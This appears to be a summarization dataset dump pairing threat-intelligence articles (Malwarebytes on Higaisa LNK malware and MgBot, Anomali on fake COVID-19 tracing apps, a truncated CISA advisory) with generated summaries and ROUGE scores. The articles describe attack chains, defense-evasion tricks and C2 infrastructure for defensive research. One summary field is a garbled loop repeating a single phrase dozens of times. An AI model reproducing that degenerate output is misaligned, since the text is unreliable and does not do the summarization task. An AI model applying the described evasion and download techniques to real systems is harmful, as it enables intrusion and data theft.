policy.rar""Both RAR archives bundle two malicious LNK files. In the newer variant (CV_Colliers.rar), the LNK files are disguised as a Curriculum Vitae (CV) and International English Language Testing System (IELTS) exam results. The older one (Project link and New copyright policy.rar) seems to target product teams that are using zeplin.io.The following shows the overall process flow when executing the malicious LNK file.Figure 1: Process graphLNK fileThe LNK file contains a list of commands that will be executed upon running, and a blob that is a base64 encoded compressed payload. Here is the list of commands that will be executed:Figure 2: Malicious lnk commandsCopy content of the LNK file into ""g4ZokyumB2DC4.tmp"" in %APPDATA% temp directory.Copy content of ""certutil.exe"" into ""gosia.exe"" ( ""*ertu*.exe is used to bypass security detection).Look for the base64 blob using ""findstr.exe"" and write it to ""cSi1rouy4.tmp"".Decode content of ""cSi1rouy4.tmp"" using ""gosia.exe -decode"" (certutil.exe -decode) and write it to ""o423DFDS4.tmp"".Decompress content of ""o423DFDS4.tmp"" in temp directory along with a decoy PDF document using ""expand.exe -F:*"" (Figure 3) .Copy ""66DF3DFG.tmp"" and ""34fDKfSD38.js"" files into ""C:\Users\Public\Downloads"" directory.Execute the JS file by calling Wscript.Open the decoy document.Figure 3: Content of the ""o423DFDS4.tmp"" cab fileThe list of commands executed by this LNK shortcut is the same as the one reported by Anomali on the Higasia Covid-19 campaign. The only difference is the name of the tmp files and name of certutil.exe which in this new case is ""gosia.exe"", while in the March campaign the name was ""mosia.exe"".Both LNK files embedded within the archive are executing similar commands with the different Command and Control (C&C) configurations. Running each of them would show a different decoy document.Figure 4: CV Decoy documentFigure 5: IELTS test result decoy documentJS fileThe JavaScript file performs the following commands:Create ""d3reEW.exe"" in ""C:\Users\Public\Downloads"" and store ""cmd /c ipconfig"" in it.Execute the dropped ""svchast.exe"".Copy ""svchhast.exe"" into startup directory and rename it as ""officeupdate.exe"".Add ""officeupdate.exe"" to scheduled tasks.Send a POST request to a hardcoded URL with ""d3reEW.exe"" as data.Figure 6: JS contentFigure7: POST requestsvchast.exeSvchast.exe is a small loader that loads the content of the shellcode stored in ""66DF3DFG.tmp"".Figure 8: Main function of svchast.exeIn fact, this shellcode is a wrapper around the final shellcode. It performs some checks and then calls the final shellcode.Figure 9: Calling final shellcodeThe final shellcode dynamically resolves the imports and allocates memory for the content that will be executed.Figure 10: Resolving the importsFigure 11: Allocate memory for new threadFinally it calls ""CreateThread"" to create a thread within its memory space to make HTTPS requests to its C&C server.Figure 11: CreateThreadAt the time of analysis, the server was down so we weren't able to clearly identify the ultimate goal of this attack.Chaining techniques for evasionWhile most malware campaigns use a simple decoy document that typically retrieves a malware payload, more advanced attackers will often try unconventional means to infect their victims.We reproduced this attack in our lab using an email as the infection vector, as we surmise that victims were spear-phished. Malwarebytes (in this case the Nebula business version) stopped the LNK file execution from WinRAR and therefore completely stopped the attack.IOCsCV_Colliers.rardf999d24bde96decdbb65287ca0986db98f73b4ed477e18c3ef100064bceba6dProject link and New copyright policy.rarc3a45aaf6ba9f2a53d26a96406b6c34a56f364abe1dd54d55461b9cc5b9d9a04Curriculum Vitae_WANG LEI_Hong Kong Polytechnic University.pdf.lnk50d081e526beeb61dc6180f809d6230e7cc56d9a2562dd0f7e01f7c6e73388d9Tokbox icon - Odds and Ends - iOS - Zeplin.lnk1074654a3f3df73f6e0fd0ad81597c662b75c273c92dc75c5a6bea81f093ef81International English Language Testing System certificate.pdf.lnkc613487a5fc65b3b4ca855980e33dd327b3f37a61ce0809518ba98b454ebf68bCurriculum Vitae_WANG LEI_Hong Kong Polytechnic University.pdf.lnkdcd2531aa89a99f009a740eab43d2aa2b8c1ed7c8d7e755405039f3a235e23a6Conversations - iOS - Swipe Icons - Zeplin.lnkc0a0266f6df7f1235aeb4aad554e505320560967248c9c5cce7409fc77b56bd5C2 domains (ipconfig exfiltration)sixindent[.]epizy[.]comgoodhk[.]azurewebsites[.]netzeplin[.]atwebpages[.]comC2s used by svchast.exe45.76.6[.]149www.comcleanner[.]infoMITRE ATT&CK techniques";"The ITSecurity report describes a new spearphishing campaign tied to the potential North Korean Higaisa APT group. The group's activities go back to at least 2016 and include the use of Trojans such as Gh0st and PlugX, as well as mobile malware. Its targets include government officials and human rights organizations, as well as other entities related to North Korea. In this latest incident, Higaisa used a malicious shortcut file ultimately responsible for creating a multistage attack that consists of several malicious scripts, payloads and decoy PDF documents. Distribution The threat actors used a malicious LNK file bundled within an archive file which was most likely distributed via spearphishing. We were able to identify two variants of this campaign that possibly have been distributed between May 12th and 31st: ""CV_Colliers.rar"" ""Project link and New copyright policy.rar"" Both RAR archives bundle two malicious LNK files. In the newer variant (CV_Colliers.rar), the LNK files are disguised as a Curriculum Vitae (CV) and International English Language Testing System (IELTS) exam results. The older one (Project link and New copyright policy.rar) seems to target product teams that are using zeplin.io. The following shows the overall process flow when executing the malicious LNK file: Figure 1: Process graph LNK file The LNK file contains a list of commands that will be executed upon running, and a blob that is a base64 encoded compressed payload. Here is the list of commands that will be executed: Figure 2: Malicious lnk commands Copy content of the LNK file into ""g4ZokyumB2DC4.tmp"" in %APPDATA";en;{'r': 0.36674259681093396, 'p': 0.9252873563218391, 'f': 0.5252854771742215};{'r': 0.28125, 'p': 0.8661087866108786, 'f': 0.42461538091457723};{'r': 0.36674259681093396, 'p': 0.9252873563218391, 'f': 0.5252854771742215}
https://www.malwarebytes.com/blog/news/2020/07/chinese-apt-group-targets-india-and-hong-kong-using-new-variant-of-mgbot-malware;Chinese APT group targets India and Hong Kong using new variant of MgBot malware;"Posted: July 21, 2020 byWe uncovered an active campaign in early July that we attribute to a new Chinese APT group attacking India and Hong Kong with MgBot malware.This blog post was authored by Hossein Jazi and Jerome SeguraOn July 2, we found an archive file with an embedded document pretending to be from the government of India. This file used template injection to drop a malicious template which loaded a variant of Cobalt Strike.One day later, the same threat actor changed their template and dropped a loader called MgBot, executing and injecting its final payload through the use of Application Management (AppMgmt) Service on Windows.On July 5, we observed yet another archive file with an embedded document borrowing a statement about Hong Kong from UK's prime minister Boris Johnson. This document used the same TTPs to drop and execute the same payload.Considering the ongoing tensions between India and China, as well as the new security laws over Hong Kong, we believe this new campaign is operated by a Chinese state-sponsored actor. Based on our analysis, we believe this may be a Chinese APT group that has been active since at least 2014.Active targeting with different luresWe were able to track the activities related to these threat actors over the succession of several days based on unique phishing attempts designed to compromise their target.'Mail security check' with Cobalt Strike (variant 1)This campaign was most likely carried out through spear phishing emails. The .rar file (Mail security check.rar) includes a document with the same name (Figure 1).Figure 1: Mail security check.docxThe document uses template injection to download a remote template from the following URL (Figure 2).Figure 2: Template injectionThe downloaded template uses the dynamic data exchange (DDE) protocol to execute malicious commands, which are encoded within the document's content (Figure 3).Figure 3: Encoded commandAfter decoding, we can see the list of commands that will be executed by DDE:Figure 4: Decoded commandsAs Figure 4 shows, the threat actors used certutil with -urlcache -split -f parameters to download a com scriptlet from its server and then used the Squiblydoo technique to execute the downloaded scriptlet via regsvr32.exe on the victim machine.This scriptlet is stored in the Documents directory as ""ff.sct"". The scriptlet is an XML file that has embedded VBscript (Figure 5).Figure 5: ff.sct snippletThe scriptlet creates a VB macro and calls Excel to execute it. The macro has been obfuscated to bypass static security mechanism and is responsible for injecting the embedded payload into rundll32.exe using the reflective DLL injection method. The injected payload is a variant of Cobalt Strike.The following diagram shows the overall process of this attack:Figure 6: Overall process'Mail security check' with MgBot (variant 2)As we mentioned earlier, a day after the first attack, the APT group changed its remote template. In this new variant, the actors stopped using the Squiblydoo technique and Cobalt Strike as a payload.Figure 7 shows the new encoded commands embedded within the template file.Figure 7: Encoded commandFigure 8 shows the list of commands that will be executed by DDE.Figure 8: Decoded commandsIn this new template file, the storm.sct scriptlet was replaced with storm.txt. Similar to the previous version, certutil is used to download the storm.txt file which is an executable stored in the Documents directory as ff.exe.The following diagram shows the overall execution process:Figure 9: Overall execution process""Boris Johnson Pledges to Admit 3 Million From Hong Kong"" with MgBot (variant 3)The last document used by the Chinese APT group in this campaign focused on issues happening in Hong Kong. The file was embedded within an archive file named ""Boris Johnson Pledges to Admit 3 Million From Hong Kong to U.K.rar"".This document quotes the prime minister after a new security law was issued by China against Hong Kong (Figure 10).Figure 10: Boris Johnson Pledges to Admit 3 Million From Hong Kong to U.K.Similar to the other documents, it also uses template injection to download the remote template (Figure 11).Figure 11: Remote templateThe downloaded template (BNOHK.docx) is similar to ADIN.docx (variant 2) in which it uses DDE to download and drop its loader.Payload analysis: MgBot (BLame, Mgmbot)The dropped executable (ff.exe) is a new variant of a loader called MgBot that drops and loads the final payload. This loader pretends to be a Realtek Audio Manager tool (Figure 12).Figure 12: File version informationIt has four embedded resources in which two of them are in Chinese Simplified language. This is an indicator that suggests this campaign is likely operated by a Chinese APT group.Figure 13: Resource languageThe loader starts its process by escalating privilege through a UAC bypass using the CMSTPLUA COM interface.MgBot uses several anti-analysis and anti-virtualization techniques. The code is self modifying which means it alters its code sections during runtime. This makes static analysis of the sample harder.MgBot tries to avoid running in known virtualized environment such as VmWare, Sandboxie and VirtualBox. To identify if it's running in one of these environments, it looks for the following DLL files: vmhgfs.dll, sbiedll.dll and vboxogl.dll and if it finds any of these DLLs, it goes to an infinite loop without doing any malicious activity (Figure 14).Figure 14: Anti-VMsIt also checks for the presence of security products on the victim's machine and takes a different execution flow if a security product is detected. For example, it checks for zhudongfangyu.exe, 360sd.exe, 360Tray.exe, MfeAVSvc.exe and McUICnt.exe in different parts of the code (Figure 15). The malware does not perform all the checks at once and it rather checks a couple of them at different steps of its execution.Figure 15: Security products checksTo invoke the required APIs, the malware does not call them directly but instead builds a function pointer table for the required APIs. Each request to an API call is made through the access to the relevant index of this table.Figure 16: Building function pointer tableAs an example, when the malware needs to invoke WinExec, it does so by invoking it through its index from the function pointer table.Figure 17: Calling API through use of function pointer tableAfter building the required API calls table, the malware performs the following procedures:It calls CreateFileW to create iot7D6E.tmp (random name starting with iot) into the %APPDATA%Temp directory. This tmp file is a cab file that embedds the final payload.It calls WriteFile to populate its contentIt calls CreateProcessInternalW to invoke expand.exe to decompress the content of iot7D6E.tmp into ProgramData\Microsoft\PlayReady\MSIBACF.tmp\tmp.dat (the MSIBACF.tmp directory name is generated randomly and starts with MSI and then is followed by a combination of random numbers and characters)Figure 18: Calling expand.exeIt calls CopyFileW to copy tmp.dat into pMsrvd.dllIt calls DeleteFileW to delete tmp.datIt drops DBEngin.EXE and WUAUCTL.EXE in the ProgramData\Microsoft\PlayReady directory. Both of these files are rundll32.exe that is used later to execute the dropped DLL.It modifies the registry hive of of HKLM\SYSTEM\CurrentControlSet\Services\AppMgmt registry location to make itself persistent. To perform this modification, it drops two registry files named iix*.tmp (random numbers have been added to iix) into the %APPDATA%Temp directory which are the old and new registry hives for the mentioned registry location.To load the dropped DLL (pMsrvd.dll) the loader registers it as a service. To achieve this, it makes use of the already installed service, AppMgmt, to load the payload as shown in the following images:Figure 18: ServiceDllFigure 19: ImagePathFinally, it executes the dropped DLL by running net start AppMgmt. After loading the DLL, the Loader creates a cmd file (lgt*.tmp.cmd) in the %APPDATA%TEMP directory with the content shown in Figure 20. Then it executes it to delete the cmd file and loader from the victim's machine.Figure 20: cmd fileWe were able to identify several different variants of this loader. In general, all the variants drop the final payload using expand.exe or extrac32.exe and then use ""net start AppMgmt"" or ""net start StiSvc"" to execute the dropped DLL with one of the following configurations:svchost.exe -k netsvcs -p -s AppMgmtsvchost.exe -k netsvcssvchost.exe -k imgsvcThe dropped DLL is the main payload used by this threat actor to perform malicious activities. The following shows the file version information pretending to be a Video Team Desktop App.Figure 21: File infoThe creation time for this DLL appears to be ""2008-04-26 16:41:12"". However, based on Rich header data, we can assert that this might have been tampered with by the threat actor.Figure 22: Rich headerThis DLL has exported several functions as shown in the following Figure. The function ServiceMain is used by this DLL to install itself as a service.Figure 23: Export functionsIt can check the running services and based on that can run itself as a service using WmiPrvSE.exe.Figure 24: Running as service using WmiPrvse.exeFigure 25: RAT's DLL is installed as service using WmiPrvse.exeIt uses several anti-debugging and anti-virtualization techniques to detect if it's running in a virtualized environment or if it is being debugged by a debugger. It uses GetTickCount and QueryPerformanceCounter API calls to detect the debugger environment.To detect if it is running in a virtual environment, it uses anti-vm detection instructions such as sldt and cpid that can provide information about the processor and also checks Vmware IO ports (VMXH).Figure 26: Environment DetectionAll the strings and used imports by this RAT are obfuscated using DES algorithm. Three different functions have been used to deobfuscate strings and imports:The first one has been used to decrypt unicode strings: In this function each string has a limit of 160 bytes and the key for decryption is: 25 00 57 50 8B C3 8AThe second function is used to decrypt ASCII strings: In this function each string has a limit of 56 bytes and the decryption key is: A2 B1 1B B1 26 7BThe last function is used to resolve API functions names in ASCII format. The decryption key is this case is 81 6E 00 E5 50 B2 D8.This final piece of code bundled in MgBot is a Remote Administration Trojan with several capabilities such as:C2 communication over TCP (42.99.116[.]225:12800)Ability to take screenshotsFile and directory management (Enumerate files and directories and send the list to the server, Rename files, Create directories, Delete files)Process managementGet drive type (FAT, FAT32, NTFS, CDFS) and free spaceInfrastructure relationsThe following shows the infrastructure used by this APT and relations between hosts used by this group. This APT group has used several different IP addresses to host its malicious payloads and also for its C2 communications.What is interesting is that the majority of IP addresses used by this APT are located in Hong Kong and almost all of these Hong Kong-based IP addresses are used for C2 communication. Even in their past campaigns they mostly have used infrastructure in Hong Kong. The graph also shows the relationship between different IP addresses used by this APT group.Figure 27: Infrastructure connectionsAndroid RATWe also found several malicious Android applications we believe are part of the toolset used by this APT group. Malwarebytes detects them as Android/Trojan.Spy.AndroRat.KSRemote.Figure 28: Malicious Android APKAll these bogus applications contain a jar file named ksremote.jar that provides the RAT functionality:Recording screen and audio using the phone'ss camera/micLocating phone with coordinatesStealing phone contacts, call log, SMS, web historySending SMS messagesFigure 29: Contact grabbing capabilityThis RAT communicates with C&C servers using random port numbers within the 122.10.89.170 to 179 range (all in Hong Kong)122.10.89[.]172:10560122.10.89[.]170:9552122.10.89[.]172:10560TTPs in line with Chinese APTsThe lures used in this campaign indicate that the threat actor may be targeting the Indian government and individuals in Hong Kong, or at least those who are against the new security law issued by China.The TTPs observed in these attacks have been used by several Chinese APT groups:Rancor APT is known to use Certutil to download their payloadKeyBoy is known to have used DDE is its previous campaignsAPT40 has utilized Squiblydoo and template injection in its previous campaigns.Considering these factors we attribute this APT attack with moderate confidence to a new Chinese APT group. Based on the TTPs used by this APT group we were able to track back its activities to at least 2014. In all their campaigns the actor has used a variant of MgBot.A threat actor with a long documented historyA Needle in a haystack blog post from 2014 detailed a campaign that drops a Trojan disguised as a legitimate MP3 encoder library. In this campaign the actor used CVE-2012-0158 to drop its Trojan. The rest of the TTPs including the methods used by the threat actor to execute MgBot and registry modifications are similar to this ongoing campaign.In 2018, this group performed another operation in which they used a VBScript vulnerability (CVE-2018-8174) to initiate their attack to drop a variants of MgBot. In March 2020, an archive file (warning.rar) was submitted to VirusTotal that we believe is part of another campaign used by this actor.We will continue this group's activities to see if their targeting or techniques evolve. Malwarebytes users are protected from this campaign thanks to our signature-less anti-exploit layer.Figure 30: Malwarebytes Nebula blocking malicious Word documentMITRE ATT&CK techniquesTactic ID Name Details Execution T1059 Command-Line Interface Starts CMD.EXE for commands execution ? T1106 Execution through Module Load Loads dropped or rewritten executable- WUAUCTL.EXE- svchost.exe- rundll32.exe ? T1053 Rundll32 Uses RUNDLL32.EXE to load library ? T1064 Scripting WScript.exe: Starts MSHTA.EXE for opening HTA or HTMLS files ? T1035 service execution Starts NET.EXE for service management T1170 mshta Starts MSHTA.EXE for opening HTA or HTMLS files T1086 PowerShell Executes PowerShell scripts Privilege Escalation T1050 new service Creates or modifies windows services through rundll32.exe ? T1088 Bypass UAC Known privilege escalation attack through DllHost.exe Persistence T1031 Modify Existing Service Creates or modifies windows services through rundll32.exe T1050 new services Creates or modifies windows services through rundll32.exe Defense Evasion T1107 File Deletion Starts CMD.EXE for self-deleting ? T1085 Rundll32 Uses RUNDLL32.EXE to load library T1088 bypass UAC Known privilege escalation attack through DllHost.exe T1497 Virtualization/Sandbox Evasion The Loader uses several anti-virtualization detections techniques T1221 Template Injection Maldoc uses template injection to download remote template T1218 Signed Binary Proxy Execution Use Squiblydoo to load executable Discovery T1012 Query Registry Reads the machine GUID from the registry T1082 System Information Discovery Reads the machine GUID from the registry T1007 System Service Discovery Starts NET.EXE for service management Lateral Movement T1105 Remote File Copy - certutil.exe: Downloads executable files from the Internet- cmd.exe: Starts CertUtil for downloading files C&C T1105 Remote File Copy - certutil.exe: Downloads executable files from the Internet- cmd.exe: Starts CertUtil for downloading files Table 1: Mitre Attack TTPsIOCs2a5890aca37a83ca02c78f00f8056e20d9b73f0532007b270dbf99d5ade59e2a Boris Johnson Pledges to Admit 3 Million From Hong Kong to U.K.docxfc885b50892fe0c27f797ba6670012cd3bbd5dc66f0eb8fdd1b5fca9f1ea98cc BNOHK.docx.zip3b93bc1e0c73c70bc8f314f2f11a91cf5912dab4c3d34b185bd3f5e7dd0c0790 Boris_Johnson_Pledges_to_Admit_3_Million_From_Hong_Kong_to_U.K.rarecf63a9430a95c34f85c4a261691d23f5ac7993f9ac64b0a652110659995fc03 Email security check.rar1e9c91e4125c60e5cc5c4c6ef8cbb94d7313e20b830a1e380d5d84b8592a7bb6 Email security check.docx3a04c1bdce61d76ff1a4e1fd0c13da1975b04a6a08c27afdd5ce5c601d99a45b ADIN.docx (storm.sct)855af291da8120a48b374708ef38393e7c944a8393880ef51352ce44e9648fd8 ADIN.docx (storm.sct)1e81fb62cb57a3231642f66fee3e10d28a7c81637e4d6a03515f5b95654da585 ff.exe (storm.txt)99aee7ae27476f057ef3131bb371a276f77a526bb1419bfab79a5fac0582b76a cobalt strikeflash.governmentmm.com: This domain used by actor to host remote templates. It has been registered 3 month ago by someone in United States.MgBot samples2310f3d779acdb4881b5014f4e57dd65b4d6638fd011ac73e90df729b58ae1e0e224d730e66931069d6760f2cac97ab0f62d1ed4ddec8b58783237d3dcd594685b0c93a70032d80c1f5f61e586edde6360ad07b697021a83ed75481385f9f51f1e81fb62cb57a3231642f66fee3e10d28a7c81637e4d6a03515f5b95654da58507bb016c3fde6b777be4b43f293cacde2d3aae0d4e4caa15e7c66835e506964f7bdfabdf9a96b3d941f90ec124836084827f6ef06fadf0dce1ae35c2361f1ac68ab344a1901d8129d99681ce33a76f7c64fd95c314ac7459c4b1527c3d968bb4f41bfc57c2681d94bf102f39d4af022beddafb4d49a49d7d7c1901d14eb698d245.77.245[.]0: This IP has been used by Cobalt Strike as a C&C server.42.99.116[.]225: C&C server used by final Payload.Android samplesb5304a0836baf1db8909128028793d12bd418ff78c69dc6f9d014cadede28b779aade1f7a1f067688d5da9e9991d3a66799065ffe82fca7bb679a71d89fec8465f7f87db34340ec83314313ec40333aebe6381ef00b69d032570749d4cedee46";The ITSecurity report has been summarized as follows: The ITSecurity report has been summarized as follows: The ITSecurity report has been summarized as follows: The ITSecurity report has been summarized as follows: The ITSecurity report has been summarized as follows: The ITSecurity report has been summarized as follows: The ITSecurity report has been summarized as follows: The ITSecurity report has been summarized as follows: The ITSecurity report has been summarized as follows: The ITSecurity report has been summarized as follows: The ITSecurity report has been summarized as follows: The ITSecurity report has been summarized as follows: The ITSecurity report has been summarized as follows: The ITSecurity report has been summarized as follows: The ITSecurity report has been summarized as follows: The ITSecurity report has been summarized as follows: The ITSecurity report has been summarized as follows: The ITSecurity report has been summarized as follows: The ITSecurity report has been summarized as follows: The ITSecurity report has been summarized as follows: The ITSecurity report has been summarized as follows: The ITSecurity report has been summarized as follows: The ITSecurity report has been summarized as follows: The ITSecurity report has been summarized as follows: The ITSecurity report has been summarized as follows: The ITSecurity report has been summarized as follows: The ITSecurity report has been summarized as follows: The ITSecurity report has been summarized as follows: The ITSecurity report has been summar;en;{'r': 0.004044489383215369, 'p': 0.4444444444444444, 'f': 0.00801603188539404};{'r': 0.0004837929366231253, 'p': 0.1111111111111111, 'f': 0.0009633910504722365};{'r': 0.004044489383215369, 'p': 0.4444444444444444, 'f': 0.00801603188539404}
https://www.anomali.com/blog/anomali-threat-research-identifies-fake-covid-19-contact-tracing-apps-used-to-monitor-devices-steal-personal-data;Anomali Threat Research Identifies Fake COVID-19 Contact Tracing Apps Used to Download Malware that Monitors Devices, Steals Personal Data;"Authored by: Tara Gould, Gage Mele, Parthiban Rajendran, and Rory GouldOverviewThreat actors are distributing fake Android applications themed around official government COVID-19 contact tracing apps. Anomali Threat Research (ATR) identified multiple applications that contain malware, primarily Anubis and SpyNote, and other generic malware families. These apps, once installed on a device, are designed to download and install malware to monitor infected devices, and to steal banking credentials and personal data. The wider security community continues to monitor ongoing malicious activity themed around COVID-19.[1] ATR believes that the fake apps are likely being distributed through other apps, third-party stores, and websites, among others. As of the publication of this research, the fake apps had not been identified as being present in the Google Play Store.Anomali Threat Research identified 12 malicious applications that appear to be targeting citizens of multiple countries. This activity consists of separate incidents of malicious activity themed around COVID-19 and should not be viewed as a coordinated campaign. Multiple countries were found to have malicious activity themed directly after government and/or malicious COVID-19-themed applications. Anomali Threat Research findings are shown below in Table 1.Table 1 - Malicious ApplicationsGovernment Tracing App Official Package Name Malicious Package Name Detection Name Armenia am.gov.covid19 am.ac19.health *Trojan Arrogyasetu (India) nic.goi.aarogyasetu com.android.tester Spynote Brazil br.gov.datasus.guardioes wocwvy.czyxoxmbauu.slsa Anubis Chhattisgarh com.mobcoder.govcth cmf0.c3b5bm90zq.patch *Trojan Columbia co.gov.ins.guardianes qmkeasedjeumxmgb.czmofiuouafiuwtmwonw.eeepqsunrbflk *Trojan Indonesia com.telkom.tracencare cmf0.c3b5bm90zq.patch Spynote Iran ir.covidapp.android co.health.covid *Trojan Italy (impersonating INPS) certificati.farma.droid ynhsumknjtd.hphsefyntauykl.hauqklysedjjnukso *Trojan Kyrgyzstan kg.cdt.stopcovid19 kg.cdt.stopcovid19 *Adware Russia - EMERCOM com.minsvyaz.gosuslugi.stopcorona anubis.bot.myapplication Anubis Singapore sg.gov.tech.bluetrace iiyyxasgfmaeph.jyefwosxdajh.ubempzgulrqdkcmjaplqrxeq *Trojan Singapore sg.gov.tech.bluetrace zfhxmtepnxyljw.wqnszljeb.bkolzgalth *Trojan*Unnamed or generic malwareTechnical AnalysisAnubisAnubis is an Android banking trojan that utilizes overlays to access infected devices and steal user credentials. The malware has been reportedly available since at least 2017 and disguises itself as legitimate applications such as fake software updates. Custom injects are used by threat actors to make the victim believe they are viewing their banking application whilean overlay controlled by the actor and placed on top of the application is used to steal sensitive information.Primary functionalities:Access to SMS messages, location, contact list, system informationCustom injections to a wide range of banking and social media applications, to harvest sensitive informationHides itself from App drawer as launchedKeyloggingPermissionsRecord phone callsSteals dataUse of overlays to steal credentialsBrazilLegitimate application - Coronavirus - SUSMalicious application - Coronavirus - SUSMalicious package - wocwvy.czyxoxmbauu.slsaSample - ec70b3f8db8a66d353cc69704b4d7141Anomali Threat Research has found a malicious application hosted on a website btc-chenger[.]xyz that impersonates the Brazilian government's official COVID tracing app. The malicious application imitates the legitimate application as a lure for victims to download the Anubis malware. When the app is first started on the device it will ask for the accessibility service privilege as shown in the figure 2. Once the user enables the permissions the app will run in the background and hides the icon from the application drawer.Figure 1 - Icon as it Appears on Android DeviceFigure 2 - Malicious app requests Accessibility permissionsFigure 3 - List of Permissions Granted by AnubisFigure 4 - Anubis SMS-Stealing AbilitiesFigure 5 - Anubis Accessing Users' ContactsSpyNoteSpyNote is an Android trojan with the primary objective of gathering and monitoring data on infected devices. The trojan was first identified by Palo Alto Unit 42 researchers in December 2016.[2] SpyNote is based off of leaked source code from malware forums and functions similarly to the Remote Access Trojans (RATs) DroidJack and OmniRat.[3]?Primary Functionalities:Access SMS, GPS Location, ContactsCall From Victims NumberCapture Photos From CameraCheck Browser HistoryCheck Installed AppsDevice InformationExfiltrate FilesInstalled ApplicationRead Or Write MessagesRead Or Write The Contacts ListRecord CallsIndonesiaLegitimate application - PeduliLindungiMalicious application - PeduliLindungiMalicious package - cmf0.c3b5bm90zq.patchSample - 0bc3d828e7ab270a8baab7a32633de0dFigure 6 - App Icon in App DrawerPeduliLindungi is an Indonesian COVID-19 tracing application created by the Republic of Indonesia Ministry of Communication and Information Technology.[4] Anomali Threat Research found an application impersonating PeduliLindungi, also called PeduliLindungi, that contains the SpyNote malware. The malicious application contains the legitimate app inside itself under the ""/raw/"" folder. When the malicious app is run, the legitimate application is installed on the device, with the malicious app hiding from the app drawer.Figure 7 - Code showing install command, used to install the legitimate APK.Figure 8 - The legitimate app, stored inside 'res/raw'ConclusionThe potential security and privacy-related risk of malicious COVID-19 apps is evident in Anomali Threat Research and other security researchers' findings. Threat actors continue to imitate official apps to take advantage of the brand recognition and perceived trust of those released by government agencies. The global impact of the COVID-19 pandemic makes the virus a recognizable and potentially fear-inducing name, of which actors will continue to abuse. This research reveals a glimpse into some of the applications threat actors are actively distributing, and there are likely numerous others in the wild that have not yet been detected.IOCsc448ae9ad80f088e9296f08a114605e266b3529f7589cac62960bfacc9dbc5f40ba9d47e0d9fa0b6db4f397a34f7efab1d94952245f517602227938a26c498006143d7b8a92dd259f595715255b99ade885d07d1532dcce08ae8e0751793ec30ed0152eee3c1321e2d051b2f0e3fa3d741bb86666543349bbf82e157b4d69a893f9b9c0fd37a8dce59048d8e000af3d6add9a29ee75b55ec8d6d7ee4f5119084edbeb3db04cbcce0af30c287581822968b8dfb8fa7c313d9d7c1b1a67646abdb54d8cfd18773b136a10f191ca27098fcd7fc4377b7a765d6bc3901d0de01008095965d02062fda3707957163afe8884da03fe22f32b683a34c452a74fbc8e78f5f33132332149fe726945397c37d37a6e6786770a2a81ce798178f4eef4ae2290dfb1977ba5ced8cdbd01ddca3fadd17a76bb2e56079dca73d759cdae9857cd5626c200785f004e492f60ce52784f745cafc2a8e3dc818de9bb5b0eff1a9983426e5db9cc8c0d42905cefeb99b442099a891a9f77671623f6c397a03bc9ec7effc362a56e6f2ebb22967eeb6e4e9a14da9eaea748420a5f832a208b35be7107b5fef389a844c0659688466d3a8fd3eb6090b5fb792b62225df6ca55fac2d96b630d596a61b7071009e0084056d04240abe2a9bbdb89e48b5eadc52830d6f92dc4355adc2bc95d5ac5d6748fee68acf1cEndnotes[1] ""A Deep Dive Into SpyNote 6.5 Android RAT,"" 70ry, accessed June 3, 2020, published February 13, 2020, https://70ry.tistory.com/412, Amrita Nayak Dutta, ""Pakistani operatives create fake Arogya Setu app to 'steal info' from Indian defence forces,"" ThePrint, accessed June 3, 2020, published April 27, 2020, https://theprint.in/defence/fears-rise-that-pakistan-based-intel-operatives-could-misuse-aarogya-setu-app/409798/, ""FAKE AAROGYA SETU ANDROID APPS HARBOR SPYWARE CAPABILITIES,"" Security News - SonicWall, accessed June 3, 2020, published May 20, 2020, https://securitynews.sonicwall.com/xmlpost/fake-aarogya-setu-android-apps-harbor-spyware-capabilities/.[2] Jacob Soo, ""SpyNote Android Trojan Builder Leaked,"" Unit 42 Palo Alto Networks, accessed June 3, 2020, published July 28, 2016, https://unit42.paloaltonetworks.com/unit42-spynote-android-trojan-builder-leaked/.[3] Ibid.[4] ""PeduliLindungi,"" Google Play, accessed June 3, 2020, https://play.google.com/store/apps/details?id=com.telkom.tracencare.AppendixApp name - com.android.testerCountry - IndiaFigure 9 - Language selector from malicious Arrogya Setu AppFigure 10 - Arrogya Setu App Home PageFigure 10 - Registration Page for Arrogya Setu AppApp Name - kg.cdt.stopcovid19Country - KyrgyzstanFigure 11 - Sign Up Page from Kyrgyzstani appApp name - am.ac19.healthCountry - ArmeniaFigure 12 - Home screen of malicious Armenian appApp Name - co.health.covidCountry - Iran";Threat actors are distributing fake Android applications themed around official government COVID19 contact tracing apps. Anomali Threat Research (ATR) identified multiple applications that contain malware, primarily Anubis and SpyNote, and other generic malware families. These apps, once installed on a device, are designed to download and install malware to monitor infected devices, and to steal banking credentials and personal data. The wider security community continues to monitor ongoing malicious activity themed around COVID19. ATR believes that the fake apps are likely being distributed through other apps, thirdparty stores, and websites, among others. As of the publication of this research, the fake apps had not been identified as being present in the Google Play Store. Anomali Threat Research has found a malicious application hosted on a website btcchenger[. ]xyz that impersonates the Brazilian government's official COVID tracing app. The malicious application imitates the legitimate application as a lure for victims to download the Anubis malware. When the app is first started on the device it will ask for the accessibility service privilege as shown in the figure 2. Once the user enables the permissions the app will run in the background and hides the icon from the application drawer. Figure 1 Icon as it Appears on Android Device Figure 2 Malicious app requests Accessibility permissions Figure 3 List of Permissions Granted by Anubis Figure 4 Anubis SMSStealing Abilities Figure 5 Anubis Accessing Users' Contacts SpyNote SpyNote is an Android trojan with the primary objective of gathering and monitoring data on infected devices. The trojan was first identified by Palo Alto Unit 42 researchers in December 2016. [;en;{'r': 0.2820976491862568, 'p': 0.9570552147239264, 'f': 0.43575418642758507};{'r': 0.24371584699453552, 'p': 0.8814229249011858, 'f': 0.38184931167469566};{'r': 0.2820976491862568, 'p': 0.9570552147239264, 'f': 0.43575418642758507}
https://www.cisa.gov/news-events/cybersecurity-advisories/aa20-302a;Ransomware Activity Targeting the Healthcare and Public Health Sector;"SummaryThis advisory was updated to include information on Conti, TrickBot, and BazarLoader, including new IOCs and Yara Rules for detection.This advisory uses the MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK(r)) version 7 framework. See the ATT&CK for Enterprise version 7 for all referenced threat actor tactics and techniques.This joint cybersecurity advisory was coauthored by the Cybersecurity and Infrastructure Security Agency (CISA), the Federal Bureau of Investigation (FBI), and the Department of Health and Human Services (HHS). This advisory describes the tactics, techniques, and procedures (TTPs) used by cybercriminals against targets in the Healthcare and Public Health (HPH) Sector to infect systems with ransomware, notably Ryuk and Conti, for financial gain.CISA, FBI, and HHS have credible information of an increased and imminent cybercrime threat to U.S. hospitals and healthcare providers. CISA, FBI, and HHS are sharing this information to provide warning to healthcare providers to ensure that they take timely and reasonable precautions to protect their networks from these 